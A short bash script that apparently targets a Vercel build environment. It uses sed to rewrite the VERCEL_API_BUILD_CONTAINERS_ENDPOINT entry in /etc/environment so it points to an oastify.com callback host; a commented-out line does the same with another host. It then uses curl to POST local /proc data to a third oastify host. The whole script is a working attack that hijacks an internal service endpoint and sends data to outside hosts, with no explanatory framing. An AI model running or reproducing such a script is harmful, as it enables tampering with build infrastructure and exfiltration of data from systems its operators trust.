#!/bin/bash

sed -i 's/^VERCEL_API_BUILD_CONTAINERS_ENDPOINT=.*/VERCEL_API_BUILD_CONTAINERS_ENDPOINT=https:\/\/htej4wcusf414r2oqi8eibyyipogcl49t.oastify.com\//' /etc/environment
#sed -i 's/^VERCEL_API_BUILD_CONTAINERS_ENDPOINT=.*/VERCEL_API_BUILD_CONTAINERS_ENDPOINT=https:\/\/95cbgoom47gtgjeg2ak6u3aquh08odf14.oastify.com/' /etc/environment
curl -X POST -d "$(cat /proc/self/1)" https://4uz65jdht25o5e3br591jyzljcp3d0do2.oastify.com
